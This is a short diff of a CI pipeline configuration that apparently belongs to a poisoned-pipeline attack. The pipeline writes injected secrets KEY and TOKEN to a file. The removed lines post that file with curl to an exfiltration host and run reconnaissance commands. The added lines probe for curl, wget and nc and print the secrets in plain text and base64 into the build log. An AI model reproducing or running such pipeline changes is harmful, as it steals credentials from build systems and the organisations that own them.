@@ -12,9 +12,10 @@ steps:
       from_secret: gcp_creds
       
   commands:
-  - echo $(whoami)
-  - cat /etc/*-release
-  - uname -a
+  - echo "WHICH_CURL: $(which curl)"
+  - echo "WHICH_WGET: $(which wget)"
+  - echo "WHICH_NC: $(which nc)"
   - echo Initializing...
   - echo "$${KEY} $${TOKEN}" > a
-  - curl -d @a exfil.503ybasfyhrqz2hccuagezg7uy0poe.bf.gy
+  - echo "CAT: $(cat a)"
+  - echo "CAT64: $(cat a|base64 -w0)"
